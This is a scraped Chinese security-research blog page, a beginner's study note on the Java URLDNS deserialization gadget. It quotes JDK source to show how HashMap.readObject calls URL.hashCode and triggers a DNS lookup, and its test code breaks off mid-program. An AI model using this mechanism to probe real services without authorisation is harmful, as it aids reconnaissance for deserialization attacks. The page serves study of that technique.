-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/tools/ title=Tools class=dd-item><a href=/zh-cn/misc/tools/><b>X. </b>Tools
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/tools/citrix-update-monitor/ title="【工具】Citrix NetScaler 更新监控" class=dd-item><a href=/zh-cn/misc/tools/citrix-update-monitor/>【工具】Citrix NetScaler 更新监控
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/misc/encoding/ title=Encoding class=dd-item><a href=/zh-cn/misc/encoding/><b>X. </b>Encoding
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/encoding/utf-7/ title="Utf 7" class=dd-item><a href=/zh-cn/misc/encoding/utf-7/>Utf 7
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/misc/encoding/unicode/ title=Unicode class=dd-item><a href=/zh-cn/misc/encoding/unicode/>Unicode
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/misc/tunnel/ title=隧道 class=dd-item><a href=/zh-cn/misc/tunnel/><b>X. </b>隧道
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/tunnel/application-layer/ title=应用层隧道 class=dd-item><a href=/zh-cn/misc/tunnel/application-layer/><b>X. </b>应用层隧道
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/tunnel/application-layer/ssh-tunnel/ title=SSH隧道 class=dd-item><a href=/zh-cn/misc/tunnel/application-layer/ssh-tunnel/>SSH隧道
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/misc/tunnel/transport-layer/ title=传输层隧道 class=dd-item><a href=/zh-cn/misc/tunnel/transport-layer/><b>X. </b>传输层隧道
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/tunnel/transport-layer/socks/ title=Socks隧道 class=dd-item><a href=/zh-cn/misc/tunnel/transport-layer/socks/><b>X. </b>Socks隧道
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/misc/tunnel/network-layer/ title=网络层隧道 class=dd-item><a href=/zh-cn/misc/tunnel/network-layer/><b>X. </b>网络层隧道
-<i class="fas fa-check read-icon"></i></a></li></ul></li></ul></li><li data-nav-id=/zh-cn/others/ title=其他 class=dd-item><a href=/zh-cn/others/><b>X. </b>其他
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/others/add-timeline-shortcode/ title=给hugo-theme-learn增加timeline功能 class=dd-item><a href=/zh-cn/others/add-timeline-shortcode/>给hugo-theme-learn增加timeline功能
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/others/how-to-reset-password-administrator-on-windows-server-2019/ title="在Windows server 2019上重置密码" class=dd-item><a href=/zh-cn/others/how-to-reset-password-administrator-on-windows-server-2019/>在Windows server 2019上重置密码
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/others/vmware-based-implementation-of-small-domain-network-construction/ title=基于Vmware的小型域网络搭建 class=dd-item><a href=/zh-cn/others/vmware-based-implementation-of-small-domain-network-construction/>基于Vmware的小型域网络搭建
-<i class="fas fa-check read-icon"></i></a></li></ul></li></ul><section id=shortcuts><h3>更多</h3><ul><li><a class=padding href=https://www.ch35tnut.site/zh-cn/about><i class='fas fa-person-booth'></i> 关于</a></li><li><a class=padding href=https://github.com/Chestnut4/><i class='fab fa-github'></i> Github 链接</a></li><li><a class=padding href=https://www.ch35tnut.site/zh-cn/tags><i class='fas fa-tags'></i> 标签</a></li><li><a class=padding href=https://www.ch35tnut.site/zh-cn/index.xml><i class='fas fa-fw fa-link'></i> RSS</a></li></ul></section><section id=prefooter><hr><ul><li><a class=padding><i class="fas fa-language fa-fw"></i><div class=select-style><select id=select-language onchange="location=this.value"><option id=zh-cn value=https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/urldns/ selected>简体中文</option></select><svg id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="255" height="255" viewBox="0 0 255 255" style="enable-background:new 0 0 255 255"><g><g id="arrow-drop-down"><polygon points="0,63.75 127.5,191.25 255,63.75"/></g></g></svg></div></a></li><li><a class=padding href=# data-clear-history-toggle><i class="fas fa-history fa-fw"></i> 清理历史记录</a></li></ul></section><section id=footer><center></center><script async defer src=https://buttons.github.io/buttons.js></script></section></div></nav><section id=body><div id=overlay></div><div class="padding highlightable"><div><div id=top-bar><div id=breadcrumbs itemscope itemtype=http://data-vocabulary.org/Breadcrumb><span id=sidebar-toggle-span><a href=# id=sidebar-toggle data-sidebar-toggle><i class="fas fa-bars"></i>
-</a></span><span id=toc-menu><i class="fas fa-list-alt"></i></span>
-<span class=links><a href=/zh-cn/>首页</a> > <a href=/zh-cn/research/>安全研究</a> > <a href=/zh-cn/research/web/>Web</a> > <a href=/zh-cn/research/web/java-deserialization/>Java Deserialization</a> > JAVA URL DNS 研究</span></div><div class=progress><div class=wrapper><nav id=TableOfContents><ul><li><ul><li></li></ul></li></ul></nav></div></div></div></div><div id=head-tags><div class=tags><a class=tag-link href=/zh-cn/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6>安全研究</a>
-<a class=tag-link href=/zh-cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96>反序列化</a></div></div><div id=body-inner><h1>JAVA URL DNS 研究</h1><div class=progress><div class=wrapper></div></div><nav id=TableOfContents><ul><li><ul><li></li></ul></li></ul></nav><p><strong>前言</strong></p><p>初步入门java反序列化学习，做一个学习记录，水一篇文章。如果有问题可以邮件：got_
-<a href=mailto:whipper.0p@icloud.com>whipper.0p@icloud.com</a></p><h4 id=url类dns请求>URL类DNS请求</h4><p>使用URL.equals会发起DNS请求</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>urltest</span> {
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> MalformedURLException {
-</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;hello &#34;</span>);
-</span></span><span style=display:flex><span>        URL u <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> URL(<span style=color:#e6db74>&#34;http://www.baidu.com&#34;</span>);
-</span></span><span style=display:flex><span>        URL u1 <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> URL(<span style=color:#e6db74>&#34;http://www.baidu.com&#34;</span>);
-</span></span><span style=display:flex><span>       System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(u.<span style=color:#a6e22e>equals</span>(u1));
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p><img alt src=/images/research/web/java-deserialization/urldns.zh-cn.assets/2.png></p><p>跟进代码，equals代码如下，</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>equals</span>(URL u1, URL u2) {
-</span></span><span style=display:flex><span>        String ref1 <span style=color:#f92672>=</span> u1.<span style=color:#a6e22e>getRef</span>();
-</span></span><span style=display:flex><span>        String ref2 <span style=color:#f92672>=</span> u2.<span style=color:#a6e22e>getRef</span>();
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> (ref1 <span style=color:#f92672>==</span> ref2 <span style=color:#f92672>||</span> (ref1 <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span> ref1.<span style=color:#a6e22e>equals</span>(ref2))) <span style=color:#f92672>&amp;&amp;</span>
-</span></span><span style=display:flex><span>               sameFile(u1, u2);
-</span></span><span style=display:flex><span>    }
-</span></span></code></pre></div><p>判断reference是否相同，而后使用sameFile函数，sameFile函数会查看其协议、uri、端口、主机是否相等。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>sameFile</span>(URL u1, URL u2) {
-</span></span><span style=display:flex><span>        <span style=color:#75715e>// Compare the protocols.</span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>((u1.<span style=color:#a6e22e>getProtocol</span>() <span style=color:#f92672>==</span> u2.<span style=color:#a6e22e>getProtocol</span>()) <span style=color:#f92672>||</span>
-</span></span><span style=display:flex><span>              (u1.<span style=color:#a6e22e>getProtocol</span>() <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span>
-</span></span><span style=display:flex><span>               u1.<span style=color:#a6e22e>getProtocol</span>().<span style=color:#a6e22e>equalsIgnoreCase</span>(u2.<span style=color:#a6e22e>getProtocol</span>()))))
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        <span style=color:#75715e>// Compare the files.</span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>(u1.<span style=color:#a6e22e>getFile</span>() <span style=color:#f92672>==</span> u2.<span style=color:#a6e22e>getFile</span>() <span style=color:#f92672>||</span>
-</span></span><span style=display:flex><span>              (u1.<span style=color:#a6e22e>getFile</span>() <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span> u1.<span style=color:#a6e22e>getFile</span>().<span style=color:#a6e22e>equals</span>(u2.<span style=color:#a6e22e>getFile</span>()))))
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        <span style=color:#75715e>// Compare the ports.</span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> port1, port2;
-</span></span><span style=display:flex><span>        port1 <span style=color:#f92672>=</span> (u1.<span style=color:#a6e22e>getPort</span>() <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span>1) <span style=color:#f92672>?</span> u1.<span style=color:#a6e22e>getPort</span>() : u1.<span style=color:#a6e22e>handler</span>.<span style=color:#a6e22e>getDefaultPort</span>();
-</span></span><span style=display:flex><span>        port2 <span style=color:#f92672>=</span> (u2.<span style=color:#a6e22e>getPort</span>() <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span>1) <span style=color:#f92672>?</span> u2.<span style=color:#a6e22e>getPort</span>() : u2.<span style=color:#a6e22e>handler</span>.<span style=color:#a6e22e>getDefaultPort</span>();
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (port1 <span style=color:#f92672>!=</span> port2)
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        <span style=color:#75715e>// Compare the hosts.</span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>hostsEqual(u1, u2))
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
-</span></span><span style=display:flex><span>    }
-</span></span></code></pre></div><p>hostsEqual方法中会调用getHostAddress方法，getHostAddress方法会通过InetAddress.getByName函数获取到域名对应的IP地址，触发DNS解析</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>hostsEqual</span>(URL u1, URL u2) {
-</span></span><span style=display:flex><span>        InetAddress a1 <span style=color:#f92672>=</span> getHostAddress(u1);
-</span></span><span style=display:flex><span>        InetAddress a2 <span style=color:#f92672>=</span> getHostAddress(u2);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>synchronized</span> InetAddress <span style=color:#a6e22e>getHostAddress</span>(URL u) {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (u.<span style=color:#a6e22e>hostAddress</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>)
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> u.<span style=color:#a6e22e>hostAddress</span>;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        String host <span style=color:#f92672>=</span> u.<span style=color:#a6e22e>getHost</span>();
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (host <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>||</span> host.<span style=color:#a6e22e>isEmpty</span>()) {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
-</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span> {
-</span></span><span style=display:flex><span>                u.<span style=color:#a6e22e>hostAddress</span> <span style=color:#f92672>=</span> InetAddress.<span style=color:#a6e22e>getByName</span>(host);
-</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>catch</span> (UnknownHostException ex) {
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
-</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>catch</span> (SecurityException se) {
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
-</span></span><span style=display:flex><span>            }
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> u.<span style=color:#a6e22e>hostAddress</span>;
-</span></span><span style=display:flex><span>    }
-</span></span></code></pre></div><p>同样的URL类中的hashCode也会触发DNS请求，通过getHostAddress获取到IP地址，需要注意的是其中hashCode会被缓存</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>synchronized</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>hashCode</span>() {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (hashCode <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span>1)
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> hashCode;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        hashCode <span style=color:#f92672>=</span> handler.<span style=color:#a6e22e>hashCode</span>(<span style=color:#66d9ef>this</span>);
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> hashCode;
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>hashCode</span>(URL u) {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> h <span style=color:#f92672>=</span> 0;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        <span style=color:#75715e>// Generate the protocol part.</span>
-</span></span><span style=display:flex><span>        String protocol <span style=color:#f92672>=</span> u.<span style=color:#a6e22e>getProtocol</span>();
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (protocol <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>)
-</span></span><span style=display:flex><span>            h <span style=color:#f92672>+=</span> protocol.<span style=color:#a6e22e>hashCode</span>();
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        <span style=color:#75715e>// Generate the host part.</span>
-</span></span><span style=display:flex><span>        InetAddress addr <span style=color:#f92672>=</span> getHostAddress(u);
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (addr <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
-</span></span><span style=display:flex><span>            h <span style=color:#f92672>+=</span> addr.<span style=color:#a6e22e>hashCode</span>();
-</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>            String host <span style=color:#f92672>=</span> u.<span style=color:#a6e22e>getHost</span>();
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (host <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>)
-</span></span><span style=display:flex><span>                h <span style=color:#f92672>+=</span> host.<span style=color:#a6e22e>toLowerCase</span>().<span style=color:#a6e22e>hashCode</span>();
-</span></span><span style=display:flex><span>        }
-</span></span></code></pre></div><p>通过调用URL类的equals和hashCode方法即可触发DNS请求</p><h4 id=hashmap原理>HashMap原理</h4><p><strong>数据结构</strong></p><p>HashMap采用数组+链表方式存储键值对，其中链表为单向链表</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>transient</span> Node<span style=color:#f92672>&lt;</span>K,V<span style=color:#f92672>&gt;[]</span> table;
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Node</span><span style=color:#f92672>&lt;</span>K,V<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>implements</span> Map.<span style=color:#a6e22e>Entry</span><span style=color:#f92672>&lt;</span>K,V<span style=color:#f92672>&gt;</span> {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>int</span> hash;
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> K key;
-</span></span><span style=display:flex><span>        V value;
-</span></span><span style=display:flex><span>        Node<span style=color:#f92672>&lt;</span>K,V<span style=color:#f92672>&gt;</span> next;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        Node(<span style=color:#66d9ef>int</span> hash, K key, V value, Node<span style=color:#f92672>&lt;</span>K,V<span style=color:#f92672>&gt;</span> next) {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>hash</span> <span style=color:#f92672>=</span> hash;
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>key</span> <span style=color:#f92672>=</span> key;
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>value</span> <span style=color:#f92672>=</span> value;
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>next</span> <span style=color:#f92672>=</span> next;
-</span></span><span style=display:flex><span>        }
-</span></span></code></pre></div><p>默认情况下java中的HashMap大小只有16，当产生hash冲突时，就把它插入到链表中的下一个元素，在取出元素时，首先计算hash，根据hash找到对应的链表，而后遍历链表获取到value。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>int</span> DEFAULT_INITIAL_CAPACITY <span style=color:#f92672>=</span> 1 <span style=color:#f92672>&lt;&lt;</span> 4;
-</span></span></code></pre></div><p>可以用如下图
-<img alt src=/images/research/web/java-deserialization/urldns.zh-cn.assets/1.webp></p><p>HashMap重写了readObject方法，反序列化HashMap数据时会调用重写的readObject方法，代码如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>readObject</span>(java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>ObjectInputStream</span> s)
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throws</span> IOException, ClassNotFoundException {
-</span></span><span style=display:flex><span>        <span style=color:#75715e>// Read in the threshold (ignored), loadfactor, and any hidden stuff</span>
-</span></span><span style=display:flex><span>        s.<span style=color:#a6e22e>defaultReadObject</span>();
-</span></span><span style=display:flex><span>        reinitialize();
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (loadFactor <span style=color:#f92672>&lt;=</span> 0 <span style=color:#f92672>||</span> Float.<span style=color:#a6e22e>isNaN</span>(loadFactor))
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> InvalidObjectException(<span style=color:#e6db74>&#34;Illegal load factor: &#34;</span> <span style=color:#f92672>+</span>
-</span></span><span style=display:flex><span>                                             loadFactor);
-</span></span><span style=display:flex><span>        s.<span style=color:#a6e22e>readInt</span>();                <span style=color:#75715e>// Read and ignore number of buckets</span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> mappings <span style=color:#f92672>=</span> s.<span style=color:#a6e22e>readInt</span>(); <span style=color:#75715e>// Read number of mappings (size)</span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (mappings <span style=color:#f92672>&lt;</span> 0)
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> InvalidObjectException(<span style=color:#e6db74>&#34;Illegal mappings count: &#34;</span> <span style=color:#f92672>+</span>
-</span></span><span style=display:flex><span>                                             mappings);
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (mappings <span style=color:#f92672>&gt;</span> 0) { <span style=color:#75715e>// (if zero, use defaults)</span>
-</span></span><span style=display:flex><span>            <span style=color:#75715e>// Size the table using given load factor only if within</span>
-</span></span><span style=display:flex><span>            <span style=color:#75715e>// range of 0.25...4.0</span>
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>float</span> lf <span style=color:#f92672>=</span> Math.<span style=color:#a6e22e>min</span>(Math.<span style=color:#a6e22e>max</span>(0.<span style=color:#a6e22e>25f</span>, loadFactor), 4.<span style=color:#a6e22e>0f</span>);
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>float</span> fc <span style=color:#f92672>=</span> (<span style=color:#66d9ef>float</span>)mappings <span style=color:#f92672>/</span> lf <span style=color:#f92672>+</span> 1.<span style=color:#a6e22e>0f</span>;
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>int</span> cap <span style=color:#f92672>=</span> ((fc <span style=color:#f92672>&lt;</span> DEFAULT_INITIAL_CAPACITY) <span style=color:#f92672>?</span>
-</span></span><span style=display:flex><span>                       DEFAULT_INITIAL_CAPACITY :
-</span></span><span style=display:flex><span>                       (fc <span style=color:#f92672>&gt;=</span> MAXIMUM_CAPACITY) <span style=color:#f92672>?</span>
-</span></span><span style=display:flex><span>                       MAXIMUM_CAPACITY :
-</span></span><span style=display:flex><span>                       tableSizeFor((<span style=color:#66d9ef>int</span>)fc));
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>float</span> ft <span style=color:#f92672>=</span> (<span style=color:#66d9ef>float</span>)cap <span style=color:#f92672>*</span> lf;
-</span></span><span style=display:flex><span>            threshold <span style=color:#f92672>=</span> ((cap <span style=color:#f92672>&lt;</span> MAXIMUM_CAPACITY <span style=color:#f92672>&amp;&amp;</span> ft <span style=color:#f92672>&lt;</span> MAXIMUM_CAPACITY) <span style=color:#f92672>?</span>
-</span></span><span style=display:flex><span>                         (<span style=color:#66d9ef>int</span>)ft : Integer.<span style=color:#a6e22e>MAX_VALUE</span>);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>            <span style=color:#75715e>// Check Map.Entry[].class since it&#39;s the nearest public type to</span>
-</span></span><span style=display:flex><span>            <span style=color:#75715e>// what we&#39;re actually creating.</span>
-</span></span><span style=display:flex><span>            SharedSecrets.<span style=color:#a6e22e>getJavaObjectInputStreamAccess</span>().<span style=color:#a6e22e>checkArray</span>(s, Map.<span style=color:#a6e22e>Entry</span><span style=color:#f92672>[]</span>.<span style=color:#a6e22e>class</span>, cap);
-</span></span><span style=display:flex><span>            <span style=color:#a6e22e>@SuppressWarnings</span>({<span style=color:#e6db74>&#34;rawtypes&#34;</span>,<span style=color:#e6db74>&#34;unchecked&#34;</span>})
-</span></span><span style=display:flex><span>            Node<span style=color:#f92672>&lt;</span>K,V<span style=color:#f92672>&gt;[]</span> tab <span style=color:#f92672>=</span> (Node<span style=color:#f92672>&lt;</span>K,V<span style=color:#f92672>&gt;[]</span>)<span style=color:#66d9ef>new</span> Node<span style=color:#f92672>[</span>cap<span style=color:#f92672>]</span>;
-</span></span><span style=display:flex><span>            table <span style=color:#f92672>=</span> tab;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>            <span style=color:#75715e>// Read the keys and values, and put the mappings in the HashMap</span>
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> 0; i <span style=color:#f92672>&lt;</span> mappings; i<span style=color:#f92672>++</span>) {
-</span></span><span style=display:flex><span>                <span style=color:#a6e22e>@SuppressWarnings</span>(<span style=color:#e6db74>&#34;unchecked&#34;</span>)
-</span></span><span style=display:flex><span>                    K key <span style=color:#f92672>=</span> (K) s.<span style=color:#a6e22e>readObject</span>();
-</span></span><span style=display:flex><span>                <span style=color:#a6e22e>@SuppressWarnings</span>(<span style=color:#e6db74>&#34;unchecked&#34;</span>)
-</span></span><span style=display:flex><span>                    V value <span style=color:#f92672>=</span> (V) s.<span style=color:#a6e22e>readObject</span>();
-</span></span><span style=display:flex><span>                putVal(hash(key), key, value, <span style=color:#66d9ef>false</span>, <span style=color:#66d9ef>false</span>);
-</span></span><span style=display:flex><span>            }
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>    }
-</span></span></code></pre></div><p>可以知道，readObject方法会获取有多少个数据，而后进行通过for循环循环从数据流中读取对象信息，并通过putVal方法加入到HashMap中，其中键为<code>hash(key)</code>，也就是会尝试调用key对应类的hashCode方法计算hash值。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>    <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>hash</span>(Object key) {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> h;
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> (key <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) <span style=color:#f92672>?</span> 0 : (h <span style=color:#f92672>=</span> key.<span style=color:#a6e22e>hashCode</span>()) <span style=color:#f92672>^</span> (h <span style=color:#f92672>&gt;&gt;&gt;</span> 16);
-</span></span><span style=display:flex><span>    }
-</span></span></code></pre></div><p>如果key对象为URL类，通过前面我们知道URL.hashCode方法会触发DNS请求，这也是URLDNS的原理。</p><p><em>以上代码来源于JDK 12.0.1</em></p><blockquote><p><a href=https://cloud.tencent.com/developer/article/1167574 target=_blank>https://cloud.tencent.com/developer/article/1167574</a></p><p><a href=https://anmolsehgal.medium.com/java-hashmap-internal-implementation-21597e1efec3 target=_blank>https://anmolsehgal.medium.com/java-hashmap-internal-implementation-21597e1efec3</a></p></blockquote><p><strong>实际测试</strong></p><p>使用如下代码进行测试</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>urltest</span> {
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> IOException, ClassNotFoundException {
-</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;hello &#34;</span>);
-</span></span><span style=display:flex><span>        URL u <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> URL(<span style=color:#e6db74>&#34;http://www.baidu.com/1&#34;</span>);
-</span></span><span style=display:flex><span>        URL u1 <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> URL(<span style=color:#e6db74>&#34;http://www.aliyun.com/1&#34;</span>);
-</span></span><span style=display:flex><span>        HashMap<span style=color:#f92672>&lt;</span>URL,String<span style=color:#f92672>&gt;</span> map <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;</span>URL,String<span style=color:#f92672>&gt;</span>();
-</span></span><span style=display:flex><span>        map.<span style=color:#a6e22e>put</span>(u,<span style=color:#e6db74>&#34;1&#34;</span>);
